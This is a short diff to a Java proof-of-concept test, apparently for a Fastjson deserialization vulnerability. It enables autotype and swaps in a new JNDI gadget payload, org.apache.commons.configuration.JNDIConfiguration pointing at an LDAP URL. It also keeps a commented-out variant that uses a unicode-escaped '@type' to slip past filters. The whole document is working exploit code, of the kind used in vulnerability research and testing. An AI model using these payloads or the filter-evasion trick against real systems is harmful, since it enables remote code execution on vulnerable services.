@@ -23,7 +23,8 @@ public class TestPoc {
 //    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
-    String payload = "{\"@type\":\"ch.qos.logback.core.db.JNDIConnectionSource\",\"jndiLocation\":\"ldap://localhost:43658/Calc\"}";//ldap方式
+//    String payload = "{\"@\\u0074ype\":\"org.apache.commons.configuration.JNDIConfiguration\",\"jndiLocation\":\"ldap://localhost:43658/Calc\"}";//ldap方式
+    String payload = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"jndiLocation\":\"ldap://localhost:43658/Calc\"}";//ldap方式
     JSON.parse(payload);
   }
 }
